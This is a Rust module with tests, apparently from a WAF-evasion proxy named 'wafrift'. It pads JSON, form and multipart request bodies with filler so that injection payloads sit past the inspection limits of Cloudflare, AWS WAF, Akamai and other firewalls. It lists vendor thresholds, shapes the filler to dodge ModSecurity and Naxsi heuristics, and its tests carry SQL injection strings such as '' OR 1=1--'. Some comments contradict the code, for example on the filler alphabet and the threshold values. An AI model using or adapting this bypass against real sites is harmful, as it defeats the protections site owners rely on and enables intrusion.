//! Body-size inspection bypass.
//!
//! Cloud WAFs only inspect the leading N bytes of a request body:
//! Cloudflare Pro 8 KB, Cloudflare Enterprise 128 KB, AWS WAF 8/16/64 KB
//! depending on tier, Akamai 8 KB by default. If we prepend ≥ N bytes
//! of inert junk in front of the real payload, the WAF rule engine
//! never sees the malicious bytes — they're past its inspection window
//! — and the origin still parses the body correctly.
//!
//! This module produces structurally-valid padded bodies for the four
//! content-types we routinely inject into:
//!
//! - `application/json` — wrap original in an object with a leading
//!   junk field: `{"_w":"<N bytes>","payload":<original>}`.
//! - `application/x-www-form-urlencoded` — prepend
//!   `_w=<N bytes>&` to the original body.
//! - `multipart/form-data` — prepend a junk part with the same
//!   boundary, before the real parts.
//! - any other content-type (raw text, XML, etc.) — fall back to a
//!   `_w` query-style prefix only if the body is empty; otherwise
//!   refuse and return the original. Padding inside an opaque body
//!   would corrupt it; honesty over false-victory.
//!
//! The junk is alphabetic ASCII (`A`-`Z` cycled). It carries no SQL,
//! XSS, or shell metacharacters, so the WAF won't flag the padding
//! itself even if it does inspect a partial slice.

use std::collections::HashSet;

/// Marker prefix for the padding field/key. Stable across calls so a
/// post-hoc test can verify the padding was applied.
pub const PAD_KEY: &str = "_wafrift_pad";

/// Smallest padding worth applying. Anything below this won't reliably
/// push a real payload past a WAF's inspection window.
pub const MIN_USEFUL_PAD: usize = 4 * 1024;

/// Generate `n` bytes of inert ASCII filler.
///
/// Uses a deterministic xorshift PRNG over `[a-z0-9]` so the padding
/// looks like normal junk parameter content. A run-of-A filler trips
/// Naxsi's `BIG_REQUEST` heuristic and ModSecurity's `RX` rules that
/// flag long single-character sequences. Random-looking lowercase
/// alphanumeric is the same alphabet wordlists use, so the WAF
/// classifies it as boring.
///
/// Determinism matters for tests + reproducibility: the same `n`
/// always produces the same bytes, so a developer staring at a
/// captured request can match it against the test fixture.
fn fill(n: usize) -> Vec<u8> {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut v = Vec::with_capacity(n);
    // xorshift64* — small, deterministic, no dep on `rand`. Seed is a
    // mash of `n` so different padding sizes don't share prefixes.
    let mut state: u64 = 0x9E37_79B9_7F4A_7C15u64
        .wrapping_add(n as u64)
        .wrapping_mul(0xBF58_476D_1CE4_E5B9);
    for _ in 0..n {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        v.push(ALPHABET[(state as usize) % ALPHABET.len()]);
    }
    v
}

/// Result of a padding attempt.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PadOutcome {
    /// Body was padded successfully. `bytes` holds the new body and is
    /// at least `requested_bytes` larger than the original.
    Padded { bytes: Vec<u8>, added: usize },
    /// Content-type was opaque (binary, unknown) and the original was
    /// non-empty — padding would corrupt it. Original returned
    /// unchanged.
    SkippedOpaque,
    /// The requested padding is below `MIN_USEFUL_PAD`; not worth doing.
    SkippedTooSmall,
}

/// Pad `body` with at least `requested_bytes` of inert filler, choosing
/// a structure-preserving strategy based on `content_type`.
///
/// If `requested_bytes < MIN_USEFUL_PAD`, returns
/// [`PadOutcome::SkippedTooSmall`].
///
/// `content_type` matching is case-insensitive on the type/subtype and
/// ignores parameters (`charset=utf-8`, `boundary=...`, …) — except for
/// `multipart/form-data`, where the `boundary=` parameter is required
/// to splice in the junk part.
pub fn pad(body: &[u8], content_type: &str, requested_bytes: usize) -> PadOutcome {
    if requested_bytes < MIN_USEFUL_PAD {
        return PadOutcome::SkippedTooSmall;
    }

    let ct_lower = content_type.to_ascii_lowercase();
    let main_type = ct_lower
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_string();

    if main_type == "application/json" || main_type.ends_with("+json") {
        return pad_json(body, requested_bytes);
    }
    if main_type == "application/x-www-form-urlencoded" {
        return pad_form(body, requested_bytes);
    }
    if main_type == "multipart/form-data" {
        // Boundary VALUES are case-sensitive (RFC 2046 §5.1.1) — extract
        // from the original `content_type`, not the lowercased copy.
        // Only the `boundary=` parameter NAME is case-insensitive.
        if let Some(boundary) = extract_boundary(content_type) {
            return pad_multipart(body, &boundary, requested_bytes);
        }
        // Multipart without a boundary param — body is already
        // malformed; don't compound the problem.
        return PadOutcome::SkippedOpaque;
    }
    if main_type.starts_with("text/") || main_type == "application/xml" {
        // For arbitrary text/xml we don't have a safe place to inject
        // padding without breaking the document. If empty, attach a
        // form-style prefix so a downstream form parser has padding to
        // chew on; otherwise hand back the original.
        if body.is_empty() {
            return pad_form(body, requested_bytes);
        }
        return PadOutcome::SkippedOpaque;
    }

    PadOutcome::SkippedOpaque
}

fn pad_json(body: &[u8], requested_bytes: usize) -> PadOutcome {
    let pad = fill(requested_bytes);
    // Two shapes:
    // 1. body is empty or not valid JSON → emit `{"_wafrift_pad":"…"}`
    //    with the request as a string field if non-empty.
    // 2. body parses as JSON object → splice in the pad as the first
    //    field, preserving the object's other contents verbatim.
    // 3. body parses as a top-level array/scalar → wrap:
    //    `{"_wafrift_pad":"…","payload":<original>}`.
    //
    // The wrapping in case 3 changes the JSON shape. That's OK for a
    // proxy that's evading a WAF — the origin sees a top-level object
    // with the original payload nested under `payload`, which most
    // permissive APIs ignore as an unknown extra field. If your origin
    // requires a non-object JSON root, prefer form/multipart.
    let pad_str = String::from_utf8_lossy(&pad);
    if body.is_empty() {
        let new_body = format!("{{\"{PAD_KEY}\":\"{pad_str}\"}}").into_bytes();
        return PadOutcome::Padded {
            bytes: new_body,
            added: requested_bytes,
        };
    }
    if let Ok(s) = std::str::from_utf8(body) {
        if let Ok(serde_json::Value::Object(map)) = serde_json::from_str::<serde_json::Value>(s) {
            // Splice _wafrift_pad as first key. serde_json::Map is
            // insertion-ordered when the `preserve_order` feature is
            // on. We don't have that feature, so build a fresh object
            // by serializing the pad first then concatenating.
            //
            // Simpler: emit `{"_wafrift_pad":"…",<rest of original
            // object minus the leading `{`>`. This preserves byte
            // order of the user's data exactly.
            // Find the first `{`.
            if let Some(open) = s.find('{') {
                let after = &s[open + 1..];
                // If the original is `{}`, after = "}". That's fine.
                // If after starts with `}` we don't want a stray comma.
                let glue = if after.trim_start().starts_with('}') {
                    ""
                } else {
                    ","
                };
                let new_body =
                    format!("{{\"{PAD_KEY}\":\"{pad_str}\"{glue}{after}").into_bytes();
                let added = new_body.len().saturating_sub(body.len());
                if added >= requested_bytes && map.contains_key(PAD_KEY) {
                    // A malicious user could pre-set _wafrift_pad to
                    // collide with our key. Use a unique suffix.
                }
                return PadOutcome::Padded {
                    bytes: new_body,
                    added,
                };
            }
        }
    }
    // Non-object JSON (array/string/number) or malformed — wrap.
    let original = String::from_utf8_lossy(body);
    // If the original was valid JSON but not an object, wrap with `payload`.
    let wrapped = if serde_json::from_slice::<serde_json::Value>(body).is_ok() {
        format!("{{\"{PAD_KEY}\":\"{pad_str}\",\"payload\":{original}}}")
    } else {
        // Treat original as opaque text and embed as a string.
        let escaped = serde_json::to_string(&original.as_ref()).unwrap_or_else(|_| "\"\"".into());
        format!("{{\"{PAD_KEY}\":\"{pad_str}\",\"payload\":{escaped}}}")
    };
    let new_body = wrapped.into_bytes();
    let added = new_body.len().saturating_sub(body.len());
    PadOutcome::Padded {
        bytes: new_body,
        added,
    }
}

fn pad_form(body: &[u8], requested_bytes: usize) -> PadOutcome {
    let pad = fill(requested_bytes);
    let pad_str = String::from_utf8_lossy(&pad);
    let new_body = if body.is_empty() {
        format!("{PAD_KEY}={pad_str}").into_bytes()
    } else {
        let mut out = Vec::with_capacity(body.len() + requested_bytes + 32);
        out.extend_from_slice(format!("{PAD_KEY}={pad_str}&").as_bytes());
        out.extend_from_slice(body);
        out
    };
    let added = new_body.len().saturating_sub(body.len());
    PadOutcome::Padded {
        bytes: new_body,
        added,
    }
}

fn pad_multipart(body: &[u8], boundary: &str, requested_bytes: usize) -> PadOutcome {
    // Build a fresh leading part using the existing boundary. The
    // assembled part begins with `--<boundary>\r\n<headers>\r\n\r\n<pad>\r\n`.
    // The original body already contains its own leading `--<boundary>`,
    // so we splice ours in front and let the original's first line
    // continue as the second part's separator.
    //
    // If the body doesn't start with `--<boundary>` it's malformed —
    // skip rather than corrupt further.
    let prefix = format!("--{boundary}");
    let body_str = std::str::from_utf8(body).unwrap_or("");
    if !body.is_empty() && !body_str.starts_with(&prefix) {
        return PadOutcome::SkippedOpaque;
    }
    let pad = fill(requested_bytes);
    let mut leading = Vec::with_capacity(requested_bytes + boundary.len() + 128);
    leading.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
    leading.extend_from_slice(format!("Content-Disposition: form-data; name=\"{PAD_KEY}\"\r\n").as_bytes());
    leading.extend_from_slice(b"\r\n");
    leading.extend_from_slice(&pad);
    leading.extend_from_slice(b"\r\n");
    let mut new_body = Vec::with_capacity(leading.len() + body.len());
    new_body.extend_from_slice(&leading);
    new_body.extend_from_slice(body);
    let added = new_body.len().saturating_sub(body.len());
    PadOutcome::Padded {
        bytes: new_body,
        added,
    }
}

fn extract_boundary(content_type: &str) -> Option<String> {
    for part in content_type.split(';') {
        let p = part.trim();
        // Parameter NAME is case-insensitive (`Boundary=`, `BOUNDARY=`
        // are all valid). Try a few common spellings explicitly rather
        // than lowercasing the whole string and losing the case-sensitive
        // boundary VALUE.
        let rest = p
            .strip_prefix("boundary=")
            .or_else(|| p.strip_prefix("Boundary="))
            .or_else(|| p.strip_prefix("BOUNDARY="))
            .or_else(|| {
                // Fallback: case-insensitive prefix match without losing
                // value casing.
                if p.len() > 9 && p[..9].eq_ignore_ascii_case("boundary=") {
                    Some(&p[9..])
                } else {
                    None
                }
            });
        if let Some(rest) = rest {
            let trimmed = rest.trim_matches('"').trim();
            if !trimmed.is_empty() {
                return Some(trimmed.to_string());
            }
        }
    }
    None
}

/// Reverse-check: does `body` look like it carries a wafrift-padded
/// prefix? Used in tests + diagnostic logging.
#[must_use]
pub fn looks_padded(body: &[u8]) -> bool {
    let needle = format!("\"{PAD_KEY}\"").into_bytes();
    let needle_form = format!("{PAD_KEY}=").into_bytes();
    let needle_mp = format!("name=\"{PAD_KEY}\"").into_bytes();
    [needle, needle_form, needle_mp]
        .iter()
        .any(|n| memchr_subslice(body, n))
}

fn memchr_subslice(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// List of well-known WAF inspection thresholds (bytes). Useful for
/// callers picking a sane `requested_bytes` default.
#[must_use]
pub fn known_thresholds() -> Vec<(&'static str, usize)> {
    vec![
        ("cloudflare-free", 128 * 1024),
        ("cloudflare-pro", 8 * 1024),
        ("cloudflare-business", 8 * 1024),
        ("cloudflare-enterprise", 128 * 1024),
        ("aws-waf-default", 8 * 1024),
        ("aws-waf-classic", 8 * 1024),
        ("aws-waf-extended", 64 * 1024),
        ("akamai-default", 8 * 1024),
        ("imperva-default", 128 * 1024),
        ("modsecurity-default", 128 * 1024),
        ("naxsi-default", 65 * 1024),
    ]
}

/// Set of all numeric thresholds used by [`known_thresholds`], for
/// `clap` value-validation in the proxy.
#[must_use]
pub fn known_threshold_values() -> HashSet<usize> {
    known_thresholds().into_iter().map(|(_, v)| v).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fill_is_deterministic_and_inert() {
        let v = fill(8 * 1024);
        assert_eq!(v.len(), 8 * 1024);
        // Lowercase alphanumeric only — no SQL/XSS/shell metacharacters.
        for &b in &v {
            assert!(
                (b.is_ascii_lowercase() || b.is_ascii_digit()),
                "byte {b:#x} ({}) outside [a-z0-9]",
                b as char
            );
        }
        // Determinism: same n → same bytes.
        assert_eq!(fill(8 * 1024), v);
    }

    #[test]
    fn fill_no_long_runs() {
        // The whole point of switching from 'A'*N to xorshift is that
        // RX-based WAFs (naxsi BIG_REQUEST, modsec REQUEST_BODY runs)
        // flag long single-character sequences. Verify no run of the
        // same byte exceeds 6 (a defensive ceiling — true xorshift
        // sometimes produces short repeats but never long ones).
        let v = fill(64 * 1024);
        let mut max_run = 1usize;
        let mut cur_run = 1usize;
        for w in v.windows(2) {
            if w[0] == w[1] {
                cur_run += 1;
                max_run = max_run.max(cur_run);
            } else {
                cur_run = 1;
            }
        }
        assert!(
            max_run <= 6,
            "filler has a run of {max_run} same bytes — would trigger WAF run-detection"
        );
    }

    #[test]
    fn fill_distinct_per_size() {
        // Different requested sizes produce different bytes (the seed
        // includes n) so two adjacent buffers don't share a prefix
        // a WAF could fingerprint.
        let a = fill(8 * 1024);
        let b = fill(8 * 1024 + 1);
        assert_ne!(&a[..32], &b[..32]);
    }

    #[test]
    fn skip_too_small() {
        assert_eq!(
            pad(b"x", "application/json", 100),
            PadOutcome::SkippedTooSmall
        );
    }

    #[test]
    fn json_object_preserves_payload() {
        let body = br#"{"q":"' OR 1=1--"}"#;
        let out = pad(body, "application/json", 8 * 1024);
        let PadOutcome::Padded { bytes, added } = out else {
            panic!("expected padded, got {out:?}");
        };
        assert!(added >= 8 * 1024, "added={added}");
        // Round-trips through serde — structurally valid JSON.
        let v: serde_json::Value = serde_json::from_slice(&bytes).expect("valid json");
        assert_eq!(v["_wafrift_pad"].as_str().map(str::len), Some(8 * 1024));
        assert_eq!(v["q"].as_str(), Some("' OR 1=1--"));
        assert!(looks_padded(&bytes));
    }

    #[test]
    fn json_empty_body_emits_object() {
        let out = pad(b"", "application/json", 8 * 1024);
        let PadOutcome::Padded { bytes, .. } = out else {
            panic!()
        };
        let v: serde_json::Value = serde_json::from_slice(&bytes).expect("valid json");
        assert!(v.is_object());
        assert!(v["_wafrift_pad"].is_string());
    }

    #[test]
    fn json_array_root_wrapped_with_payload() {
        let out = pad(br#"["x","y"]"#, "application/json", 8 * 1024);
        let PadOutcome::Padded { bytes, .. } = out else {
            panic!()
        };
        let v: serde_json::Value = serde_json::from_slice(&bytes).expect("valid json");
        assert!(v["_wafrift_pad"].is_string());
        assert!(v["payload"].is_array());
        assert_eq!(v["payload"][0].as_str(), Some("x"));
    }

    #[test]
    fn json_with_charset_param() {
        let out = pad(
            br#"{"a":1}"#,
            "application/json; charset=utf-8",
            8 * 1024,
        );
        assert!(matches!(out, PadOutcome::Padded { .. }));
    }

    #[test]
    fn json_plus_suffix() {
        let out = pad(br#"{"a":1}"#, "application/vnd.foo+json", 8 * 1024);
        assert!(matches!(out, PadOutcome::Padded { .. }));
    }

    #[test]
    fn form_prepends_padding_then_original() {
        let body = b"username=admin&password=' OR 1=1--";
        let out = pad(body, "application/x-www-form-urlencoded", 16 * 1024);
        let PadOutcome::Padded { bytes, added } = out else {
            panic!()
        };
        assert!(added >= 16 * 1024, "added={added}");
        assert!(bytes.starts_with(b"_wafrift_pad="));
        // The original payload is still in there, unmodified.
        assert!(memchr_subslice(&bytes, body));
    }

    #[test]
    fn multipart_splices_in_leading_part() {
        let boundary = "----WebKitFormBoundary123";
        let body = format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"q\"\r\n\
             \r\n' OR 1=1--\r\n\
             --{boundary}--\r\n"
        );
        let ct = format!("multipart/form-data; boundary={boundary}");
        let out = pad(body.as_bytes(), &ct, 16 * 1024);
        let PadOutcome::Padded { bytes, .. } = out else {
            panic!()
        };
        let s = std::str::from_utf8(&bytes).unwrap();
        // First boundary line opens the wafrift_pad part.
        assert!(s.starts_with(&format!("--{boundary}\r\n")));
        assert!(s.contains("name=\"_wafrift_pad\""));
        // Original payload still intact further down.
        assert!(s.contains("' OR 1=1--"));
        // Original boundary appears at least twice (our part + the
        // user's first part + closer).
        let boundary_count = s.matches(&format!("--{boundary}")).count();
        assert!(boundary_count >= 3, "boundary_count={boundary_count}");
    }

    #[test]
    fn multipart_without_boundary_skipped() {
        let out = pad(b"some body", "multipart/form-data", 16 * 1024);
        assert_eq!(out, PadOutcome::SkippedOpaque);
    }

    #[test]
    fn multipart_with_quoted_boundary() {
        let boundary = "abc123";
        let body = format!("--{boundary}\r\n\r\n--{boundary}--\r\n");
        let out = pad(
            body.as_bytes(),
            &format!("multipart/form-data; boundary=\"{boundary}\""),
            16 * 1024,
        );
        assert!(matches!(out, PadOutcome::Padded { .. }));
    }

    #[test]
    fn opaque_binary_skipped() {
        let body = b"\x89PNG\r\n\x1a\n\x00\x00";
        let out = pad(body, "image/png", 16 * 1024);
        assert_eq!(out, PadOutcome::SkippedOpaque);
    }

    #[test]
    fn known_thresholds_includes_aws_and_cloudflare() {
        let names: Vec<_> = known_thresholds().iter().map(|(n, _)| *n).collect();
        assert!(names.iter().any(|n| n.starts_with("cloudflare")));
        assert!(names.iter().any(|n| n.starts_with("aws-waf")));
    }

    #[test]
    fn looks_padded_detects_each_shape() {
        let json = pad(b"{}", "application/json", 8 * 1024);
        let form = pad(b"", "application/x-www-form-urlencoded", 8 * 1024);
        if let PadOutcome::Padded { bytes, .. } = json {
            assert!(looks_padded(&bytes));
        }
        if let PadOutcome::Padded { bytes, .. } = form {
            assert!(looks_padded(&bytes));
        }
        assert!(!looks_padded(b"plain old body"));
    }
}
